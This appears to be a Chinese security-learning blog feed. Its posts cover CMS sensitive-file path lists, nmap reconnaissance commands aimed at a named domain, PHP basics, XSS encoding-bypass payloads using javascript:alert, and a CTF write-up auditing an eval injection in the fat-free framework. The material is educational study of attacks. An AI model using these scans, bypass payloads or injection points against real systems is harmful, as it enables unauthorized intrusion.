class="line">/temp/compiled/user_menu.lbi.php</span><br><span class="line">/temp/compiled/message.dwt.php</span><br><span class="line">/temp/compiled/admin/pagefooter.htm.php</span><br><span class="line">/temp/compiled/admin/page.htm.php</span><br><span class="line">/temp/compiled/admin/start.htm.php</span><br><span class="line">/temp/compiled/admin/goods_search.htm.php</span><br><span class="line">/temp/compiled/admin/index.htm.php</span><br><span class="line">/temp/compiled/admin/order_list.htm.php</span><br><span class="line">/temp/compiled/admin/menu.htm.php</span><br><span class="line">/temp/compiled/admin/login.htm.php</span><br><span class="line">/temp/compiled/admin/message.htm.php</span><br><span class="line">/temp/compiled/admin/goods_list.htm.php</span><br><span class="line">/temp/compiled/admin/pageheader.htm.php</span><br><span class="line">/temp/compiled/admin/top.htm.php</span><br><span class="line">/temp/compiled/top10.lbi.php</span><br><span class="line">/temp/compiled/member_info.lbi.php</span><br><span class="line">/temp/compiled/bought_goods.lbi.php</span><br><span class="line">/temp/compiled/goods_related.lbi.php</span><br><span class="line">/temp/compiled/page_header.lbi.php</span><br><span class="line">/temp/compiled/goods_script.html.php</span><br><span class="line">/temp/compiled/index.dwt.php</span><br><span class="line">/temp/compiled/goods_fittings.lbi.php</span><br><span class="line">/temp/compiled/myship.dwt.php</span><br><span class="line">/temp/compiled/brands.lbi.php</span><br><span class="line">/temp/compiled/help.lbi.php</span><br><span class="line">/temp/compiled/goods_gallery.lbi.php</span><br><span class="line">/temp/compiled/comments.lbi.php</span><br><span class="line">/temp/compiled/myship.lbi.php</span><br><span class="line">/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php</span><br><span class="line">/includes/modules/cron/auto_manage.php</span><br><span class="line">/includes/modules/cron/ipdel.php</span><br></pre></td></tr></table></figure>



<h3 id="PHP168"><a href="#PHP168" class="headerlink" title="PHP168"></a>PHP168</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">/admin/inc/hack/count.php?job=list</span><br><span class="line">/admin/inc/hack/search.php?job=getcode</span><br><span class="line">/admin/inc/ajax/bencandy.php?job=do</span><br><span class="line">/cache/MysqlTime.txt</span><br><span class="line">/PHPcms2008-sp4</span><br></pre></td></tr></table></figure>



<h3 id="CMSeasy"><a href="#CMSeasy" class="headerlink" title="CMSeasy"></a>CMSeasy</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">/lib/mods/celive/menu_top.php</span><br><span class="line">/lib/default/ballot_act.php</span><br><span class="line">/lib/default/special_act.php</span><br></pre></td></tr></table></figure>

<p>参考:<a href="https://my.oschina.net/u/4324366/blog/3442695">https://my.oschina.net/u/4324366/blog/3442695</a></p>
]]></content>
  </entry>
  <entry>
    <title>国科安全渗透测试第一课</title>
    <url>/2021/01/25/%E5%9B%BD%E7%A7%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%AC%E4%B8%80%E8%AF%BE/</url>
    <content><![CDATA[<h1 id="国科安全第一课"><a href="#国科安全第一课" class="headerlink" title="国科安全第一课"></a>国科安全第一课</h1><p>渗透测试思路：<br>1.信息收集<br>2.漏洞挖掘<br>3.漏洞利用<br>4.输出渗透测试报告<br>渗透测试之信息收集                      <a id="more"></a><br>1.基本信息<br>》域名信息   例:goktech.cn  工具:站长之家  Layer工具<br>》子域名       例:bbs.goktech.cn<br>》ip地址<br>》同ip的其他网站信息(旁站) –站长之家<br>》同网段的其他服务器信息（c段）<br>》端口:(http80、https443)、445（共享端口（共享文件夹））<br>》服务(web服务)，服务版本<br>》信息泄露——github.com(开源代码网站) </p>
<p>2.os操作系统版本——Nmap工具（kali要有ip地址，并且和你的目标服务器网络可达（ping通），区分大小写）<br>nmap -sn +域名/网段/ip地址<br> //-sP 用ping的方式判断是否有存货主机，不扫面端口<br>//-sT 使用TCP进行连接，对目标主机所欲端口进行完整的三次握手，如果成功建立连接则说明端口开放**(TCP三次握手)**<br>//-sU：使用UDP数据包经行扫描，返回UDP报文，则端口是开放的，返回不可达则处于过滤状态<br>nmap -sT -O 目标ip地址（使用sT方式扫描目标主机信息（O代表检测操作系统信息））<br>-p+端口号: 扫描指定端口<br>例子：nmap -sS -p 80,443 +ip地址<br>-sV：服务版本<br>导出到指定文本：<br>nmap -sT -p 3389 –open ip -oN 3.txt<br>cat 3.txt</p>
<p>linux、wind、mac<br>3.web中间件(web程序，用来提供网页服务)<br>类型:iis，apache、nginx、weblogic<br>4.数据库以及版本<br>类型、版本:mysql,mssql,oracle,access<br>5.后端的脚本类型、版本<br>php、jsp、asp、aspx</p>
<p>域名<a href="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210125194711.pnghttp://whois.chinaz.com/goktech.cn">https://raw.githubusercontent.com/Hwwg/myphoto/master/20210125194711.pnghttp://whois.chinaz.com/goktech.cn</a><br>子域名<a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></p>
]]></content>
  </entry>
  <entry>
    <title>正则表达式学习</title>
    <url>/2021/01/30/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>PHP学习</title>
    <url>/2020/10/06/PHP%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="PHP的基本语法"><a href="#PHP的基本语法" class="headerlink" title="PHP的基本语法"></a>PHP的基本语法</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">PHP 代码</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>展示一下实例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="PHP的变量作用域"><a href="#PHP的变量作用域" class="headerlink" title="PHP的变量作用域"></a>PHP的变量作用域</h2><p>变量的作用域是脚本中变量可被引用/使用的部分。          <a id="more"></a></p>
<p>PHP 有四种不同的变量作用域：</p>
<ul>
<li><p>local</p>
</li>
<li><p>global</p>
</li>
<li><p>static</p>
</li>
<li><p>parameter</p>
<p>着重讲一下 global和static吧<br>首先是global，在函数内部施加该命令，变量在函数内部可以引用函数外部的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$x=<span class="number">5</span>;</span><br><span class="line">$y=<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $x,$y;</span><br><span class="line">    $y=$x+$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">myTest();</span><br><span class="line"><span class="keyword">echo</span> $y; <span class="comment">// 输出 15</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>接下来是static命令，就是你在对一个变量施加该命令后，该变量的值发生改变后，在下次使用该变量时，这个值的量已经不在是初始量，而是变化后的量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> $x=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">echo</span> $x;</span><br><span class="line">    $x++;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;    <span class="comment">// 换行符</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">myTest();</span><br><span class="line">myTest();</span><br><span class="line">myTest();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出的值是0 1 2</p>
<p>当我把static这个指令删除后，输出的值就变成了000</p>
<p>最后是echo和print输出语句<br>格式都是”输出内容”，不过区别在于，echo可以这样:echo”输””出””代码”，而print 只能一次性输出</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>由xss引发的对于浏览器解码和编码流程认识</title>
    <url>/2021/01/29/%E7%94%B1xss%E5%BC%95%E5%8F%91%E7%9A%84%E5%AF%B9%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E7%A0%81%E5%92%8C%E7%BC%96%E7%A0%81%E6%B5%81%E7%A8%8B%E8%AE%A4%E8%AF%86/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h2><p>看到xss的编码绕过写法后，其实感觉很懵， 不知道为啥他要这样写，故决定去学习一下浏览器解码和编码的过程 <a id="more"></a></p>
<h2 id="浏览器的大致工作流程"><a href="#浏览器的大致工作流程" class="headerlink" title="浏览器的大致工作流程"></a>浏览器的大致工作流程</h2><p>浏览器最早开始解析html，将标签转化为内容树上的DOM节点，然后此时还是无法识别出哪些被实体编码，接下来建立起DOM树，才可以识别哪些为实体编码，并将其解码，在此基础上，javascript DOM API参与进来，可以对DOM树进行修改，改变DOM树的结构和内容，而CSS主要负责解析外部CSS文件和style 的样式标签</p>
<p>DOM树参考:<a href="https://zh.javascript.info/dom-nodes">https://zh.javascript.info/dom-nodes</a></p>
<p>在知道大致的一个工作流程后，分析其中的编码解码过程:</p>
<h2 id="解析流"><a href="#解析流" class="headerlink" title="解析流:"></a>解析流:</h2><p>在知道完大致工作流程后，我们理一下各个解析器发挥作用的顺序:</p>
<h3 id="html-gt-url-gt-javascript"><a href="#html-gt-url-gt-javascript" class="headerlink" title="html-&gt;url-&gt;javascript"></a>html-&gt;url-&gt;javascript</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;UserInput&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中：首先html解析器进行解析，并进行实体编码的解码，接下来如果在这个userinput中设计URL内容，那么url解析器会发先发挥作用，进行URL解码，如果URL资源是JavaScript类型，JavaScript解析器将会发挥作用，进行解码</p>
<h3 id="html-gt-javascript-gt-url"><a href="#html-gt-javascript-gt-url" class="headerlink" title="html-&gt;javascript-&gt;url"></a>html-&gt;javascript-&gt;url</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span>   <span class="attr">onclick</span>=<span class="string">&quot;window.open(&#x27;UserInput&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在这里 还是先html进行解析，接下来onclick的值是有JavaScript解析器进行解析处理的，处理的是window.open中的input，此时设计URL的参数，URL解析器就会对其中的内容进行解码，并将其结果传回给JavaScript</p>
<h2 id="HTML解析"><a href="#HTML解析" class="headerlink" title="HTML解析"></a>HTML解析</h2><p>HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个‘&lt;’符号（后面没有跟‘/’）符号就会进入标签开始符号，然后转变到标签名状态，最后是数据状态并释方当前标签的token，当解析器处于数据状态时，它会继续解析，每当发现一个完整的标签，就会释放一个token。<br>在前面的工作流程中我们说到，在建立起DOM树后会识别哪些为实体编码，并将其解码。<br>这里我们将深入讲解一下整个过程:<br>字符实体分为三种:<br>1.数据状态中的字符引用<br>2.RCDATA状态中的字符引用<br>3.属性值状态中的字符引用</p>
<h5 id="数据状态中的字符引用"><a href="#数据状态中的字符引用" class="headerlink" title="数据状态中的字符引用"></a>数据状态中的字符引用</h5><p>这些状态中HTML字符实体将会从”&amp;#..”形式编码，对应的解码字符会被放入数据缓冲区中,例如:”&lt;”被编码为“&amp;#60”。当解析器遇到&amp;字符，它会知道这是”数据状态的字符引用”，因此会消耗一个字符引用，并释放出相应的token，但是这里的&lt;的token不会被理解是标签的开始，原因是解析器解析这个这个字符引用后不会转换到标签开始状态。<br><strong>字符实体</strong>：字符实体是一个转义序列，它定义了一般无法在文本内容中输入的单个字符或符号。一个字符实体以一个&amp;符号开始，后面跟着一个预定义的实体的名称，或是一个#符号以及字符的十进制数字<br><strong>HTML字符实体</strong></p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210129144450.png" alt="img"></p>
<p><strong>一点思考</strong>:当我们输入的xss脚本语句中&lt;&gt;被转义成<code>&amp;#60;</code>的时候，那么我们的xss脚本将不起作用。</p>
<h5 id="RCDATA状态中的字符引用："><a href="#RCDATA状态中的字符引用：" class="headerlink" title="RCDATA状态中的字符引用："></a>RCDATA状态中的字符引用：</h5><p>这里要提一下RCDATA的概念。要了解什么是RCDATA，我们先要了解另一个概念。在HTML中有五类元素：</p>
<p>1空元素(Void elements)，如<code>&lt;area&gt;</code>,<code>&lt;br&gt;</code>,<code>&lt;base&gt;</code>等等</p>
<p>2原始文本元素(Raw text elements)，有<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code></p>
<p>3RCDATA元素(RCDATA elements)，有<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code></p>
<p>4外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素</p>
<p>5基本元素(Normal elements)，即除了以上4种元素以外的元素<br>五类元素的区别如下：</p>
<p>1空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。</p>
<p>2原始文本元素，可以容纳文本。</p>
<p>3RCDATA元素，可以容纳文本和字符引用。</p>
<p>4外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释</p>
<p>5基本元素，可以容纳文本、字符引用、其他元素和注释</p>
<p>在RCDATA状态中，唯一能够被解析进入标签开始状态的只有<code>&lt;textarea&gt;</code>和<code>&lt;text&gt;</code>等RCDATA元素，以为这如果有一个语句是：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(6)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个语句当中的alert是不会被执行的，因为<code>&lt;script&gt;</code>不会被解析为标签开始状态</p>
<p>CDATA元素。任何在CDATA元素中的内容将不会触发解析器创建开始标签。闭合CDATA元素的标志是“]]&gt;”序列。因此如果用户想逃出CDATA元素，就要用未经任何编码的“]]&gt;”序列，不然是不会逃出CDATA元素的。</p>
<h2 id="URL解析"><a href="#URL解析" class="headerlink" title="URL解析"></a>URL解析</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">URL encoded &quot;javascript:alert(1)&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag"><span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span>:%61</span></span></span><br><span class="line"><span class="tag"><span class="string">%6c%65%72%74%28%32%29&quot;</span>&gt;</span></span><br><span class="line">Character entity encoded &quot;javascript&quot; and URL encoded &quot;alert(2)&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript%3aalert(3)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">URL encoded &quot;:&quot;</span><br></pre></td></tr></table></figure>

<p>上面这三段代码中 只有中间那段会成功弹窗，原因是:<br>URL资源类型必须是ASCII字母，不然就会进入无类型状态，该规则同样适应于那个“:”号,我们知道html经过解析文本，并会对其字符实体进行解码，而在第一段和第三段JavaScript没有被解码，所以不会被URL解析器所识别，所以不会被解码。</p>
<h2 id="javascript解析"><a href="#javascript解析" class="headerlink" title="javascript解析"></a>javascript解析</h2><h4 id="在script块中的字符实体编码不会被解析"><a href="#在script块中的字符实体编码不会被解析" class="headerlink" title="在script块中的字符实体编码不会被解析:"></a>在script块中的字符实体编码不会被解析:</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span>&amp;#116<span class="symbol">&amp;#40;</span><span class="symbol">&amp;#57;</span><span class="symbol">&amp;#41;</span>&amp;#59</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Character entity encoded alert(9);</span><br></pre></td></tr></table></figure>

<h4 id="js支持Unicode解析所在位置"><a href="#js支持Unicode解析所在位置" class="headerlink" title="js支持Unicode解析所在位置"></a>js支持Unicode解析所在位置</h4><h5 id="字符串中"><a href="#字符串中" class="headerlink" title="字符串中"></a>字符串中</h5><p>当Unicode转义序列存在于字符串中时，它只会被解释为正规字符，而不是单引号，双引号或者换行符这些能够打破字符串上下文的字符。这项内容清楚地写在ECMAScript中。因此，Unicode转义序列将永远不会破环字符串上下文，因为它们只能被解释成字符串常量。</p>
<h5 id="标识符名称中"><a href="#标识符名称中" class="headerlink" title="标识符名称中"></a>标识符名称中</h5><p>什么是标识符？<br>java语言中，对于变量，常量，函数，语句块也有名字，我们统统称之为标识符Java标识符类似于我们C语言中定义的变量，定义规则如下:<br><a href="https://blog.csdn.net/shuaigexiaobo/article/details/86617080">https://blog.csdn.net/shuaigexiaobo/article/details/86617080</a><br>如果unicode转义序列出现在标识符中，它会被解码并解释为标识符的一部分</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>\u0061\u006c\u0065\u0072\u0074(10);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Unicode Escape sequence encoded alert</span><br></pre></td></tr></table></figure>

<h5 id="控制字符中"><a href="#控制字符中" class="headerlink" title="控制字符中"></a>控制字符中</h5><p>什么是控制字符？<br>例如单引号、双引号、圆括号等，这里可以简单理解为C语言中我们打printf(“”)里面的这个双引号<br><a href="https://www.netinbag.com/cn/internet/what-is-a-control-character.html">https://www.netinbag.com/cn/internet/what-is-a-control-character.html</a><br>在unicode转义序列表示一个控制字符时，它们将不会被解释成一个控制字符，而是被解码解析为标识符名称或者字符串常量。<br>例子：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Unicode Escape sequence encoded alert(11)</span><br><span class="line">//这里不会弹窗是因为，这里的控制字符()被解码后失去其控制字符的属性了</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(&#x27;13\u0027)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Unicode escape sequence encoded ’</span><br><span class="line">//这里的是因为控制字符&#x27;&#x27;被转义了</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;confirm(&#x27;8\u0027);&quot;</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">Unicode escape sequence encoded &#x27;</span><br><span class="line">同样单引号</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Unicode Escape sequence encoded alert and 12 </span><br><span class="line">这个也不许 解码后缺少单引号<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">\u0061\u006c\u0065\u0072\u0074(<span class="string">&#x27;\u0031\u0032&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">这样就对了</span><br></pre></td></tr></table></figure>

<p>参考<a href="http://test.attacker-domain.com/browserparsing/answers.txt">http://test.attacker-domain.com/browserparsing/answers.txt</a><br><a href="http://bobao.360.cn/learning/detail/292.html">http://bobao.360.cn/learning/detail/292.html</a><br><a href="https://www.hackersb.cn/hacker/85.html">https://www.hackersb.cn/hacker/85.html</a><br><a href="https://xz.aliyun.com/t/5863">https://xz.aliyun.com/t/5863</a><br><a href="https://zh.javascript.info/dom-nodes">https://zh.javascript.info/dom-nodes</a><br><a href="http://xuelinf.github.io/2016/05/18/%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/">http://xuelinf.github.io/2016/05/18/%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/</a></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>身为一个菜鸟，感觉理清楚这些以后，对于之前XSS博客写的编码绕过终于能体会一些了，果然学东西还是不能学的不清不楚的</p>
]]></content>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>虎符比赛wp——fat free框架注入漏洞审计学习</title>
    <url>/2021/04/04/%E7%BA%A2%E8%B0%B7%E6%9D%AF-%E8%99%8E%E7%AC%A6%E6%AF%94%E8%B5%9Bwp/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>赛后复现学习学习，今天主要学习一下通过审计构造注入语句<a id="more"></a></p>
<h2 id="代码审计基本步骤"><a href="#代码审计基本步骤" class="headerlink" title="代码审计基本步骤"></a>代码审计基本步骤</h2><p><strong>入口文件——&gt;文件监控——&gt;正式审计</strong></p>
<h3 id="正式审计步骤"><a href="#正式审计步骤" class="headerlink" title="正式审计步骤"></a>正式审计步骤</h3><p>我把审计分为安装前和安装后两个部分，安装前审完了之后我们就可以开始看网站的其他文件是否存在漏洞了，这个时候一般分为两种审计方式：</p>
<p>1.通过危险函数逆推是否用户可控<br>2.通读所有代码<br>3.黑盒+白盒</p>
<p>我一般都会用第一种或者第二种方式，第一种方式能够快速的找到漏洞但是漏的可能会多，第二种方式一般用在规模比较小的cms，因为文件较少，所以代码全看了也花不了多少功夫，第三种我很少用，我觉得这是新手审计的缺点，其实更应该黑盒+白盒一起用的，因为在黑盒里我们可能可以发现一些看代码的时候不注意的漏洞，比如越权/逻辑等漏洞。</p>
<ul>
<li>分析源码目录</li>
</ul>
<p>我们在这个步骤只需要对源码目录有个大概的了解，知道每个目录里放的是什么文件就行了，比如install目录放的安装文件，admin目录放的后台管理相关的文件，function目录放的网站运行时需要用到的方法的相关文件等。</p>
<ul>
<li>分析过滤情况</li>
</ul>
<p>在这个步骤我们要对源码的过滤情况进行分析，看看是全局过滤还是单独写某个函数用于对输入点一个个的过滤。</p>
<h2 id="审计对象注意点"><a href="#审计对象注意点" class="headerlink" title="审计对象注意点"></a>审计对象注意点</h2><h3 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h3><h4 id="五大特性"><a href="#五大特性" class="headerlink" title="五大特性"></a>五大特性</h4><p>1.能够执行任意代码的函数<br>2.常见能够读取网络资源的函数<br>3.能够执行系统命令或者调用外部程序的函数<br>4.能够操作文件（读取、移动、删除）的函数<br>5.能修改运行时候的上下文环境（覆盖变量/函数）</p>
<h4 id="任意执行代码函数："><a href="#任意执行代码函数：" class="headerlink" title="任意执行代码函数："></a>任意执行代码函数：</h4><p>1.把传入的字符串当做php代码直接执行:</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404172220.jpeg" alt="img"></p>
<p>2.引入文件执行php代码，php里引入文件执行代码的函数:</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404172317.jpeg" alt="img"><br>3.第3种是一些数据处理函数,它们存在支持<strong>回调函数</strong>类型的<strong>参数</strong>,这个参数可以传入<strong>函数的字符串名称</strong>,一旦这个参数可控,那么可能造成漏洞,这些函数的特征非常明显,参数类型是<strong>callback</strong>形式,审计的基本上就是看他们的回调函数是不是用<strong>字符串</strong>的形式传递,是否<strong>可控</strong>,在PHP里存在大量的这种函数,这里只举5个比较常见的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404172439.jpeg" alt="img"></p>
<h4 id="能够执行系统命令或者调用外部程序的函数"><a href="#能够执行系统命令或者调用外部程序的函数" class="headerlink" title="能够执行系统命令或者调用外部程序的函数"></a>能够执行系统命令或者调用外部程序的函数</h4><p>能够执行系统命令或者调用外部程序的函数,这些函数使用不当容易引起命令注入,一般需要通常需要结合escapeshellcmd或escapeshellarg函数过滤传入的变量</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404172517.jpeg" alt="img"></p>
<h4 id="能够操作文件-读写-移动-删除-的函数"><a href="#能够操作文件-读写-移动-删除-的函数" class="headerlink" title="能够操作文件(读写,移动,删除)的函数"></a>能够操作文件(读写,移动,删除)的函数</h4><p>能够操作文件(读写,移动,删除)的函数,在审计的时候也要注意传入的变量是否可控,是否存在穿越目录,导致任意文件读写的情况</p>
<h4 id="能够修改运行时候的上下文环境-覆盖变量-函数"><a href="#能够修改运行时候的上下文环境-覆盖变量-函数" class="headerlink" title="能够修改运行时候的上下文环境(覆盖变量/函数)"></a>能够修改运行时候的上下文环境(覆盖变量/函数)</h4><p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404172554.jpeg" alt="img"></p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>下载 fat-free框架源码，将题目换成源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Kickstart the framework</span></span><br><span class="line">$f3=<span class="keyword">require</span>(<span class="string">&#x27;lib/base.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$f3-&gt;set(<span class="string">&#x27;DEBUG&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">float</span>)PCRE_VERSION&lt;<span class="number">8.0</span>)</span><br><span class="line">    trigger_error(<span class="string">&#x27;PCRE version is out of date&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load configuration</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$a=$_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">unset</span>($f3-&gt;$a);</span><br><span class="line"></span><br><span class="line">$f3-&gt;run();</span><br></pre></td></tr></table></figure>

<p>这边包含了一个base.php文件，所以我直接去base.php中查看，搜索下看看有没有危险函数：在clear()方法中查找到eval函数，于是传入参数，直接定位到这里面看看<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404173536.png" alt="img" style="zoom:67%;"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump($key);</span><br><span class="line">var_dump(<span class="keyword">$this</span>-&gt;compile(<span class="string">&#x27;@hive&#x27;</span>.$key,<span class="literal">FALSE</span>));</span><br><span class="line">$val=preg_replace(<span class="string">&#x27;/^(\$hive)/&#x27;</span>,<span class="string">&#x27;$this-&gt;hive&#x27;</span>,<span class="keyword">$this</span>-&gt;compile(<span class="string">&#x27;@hive.&#x27;</span>.$key,<span class="literal">FALSE</span>));</span><br><span class="line">var_dump(<span class="string">&#x27;unset(&#x27;</span>.$val.<span class="string">&#x27;);&#x27;</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;unset(&#x27;</span>.$val.<span class="string">&#x27;);&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>这里画个重点</strong>其实之前在学C原因的时候也有这样的调试方法，可能是太久没写代码了，都给忘了，真是无语哈哈哈<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404173601.png" alt="img" style="zoom:67%;"><br>可以看到输入内容，此时直接在url上构造payload即可</p>
<p><strong>如果不定位的话：</strong></p>
<p>断点打在get语句，直接步入跟踪：</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404174325.png" alt="img" style="zoom:67%;">

<p>原来这个unset函数重新定义了：</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404174326.png" alt="img" style="zoom:67%;">

<p>继续跟进:进入clear方法中：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404174327.png" alt="img" style="zoom:67%;"></p>
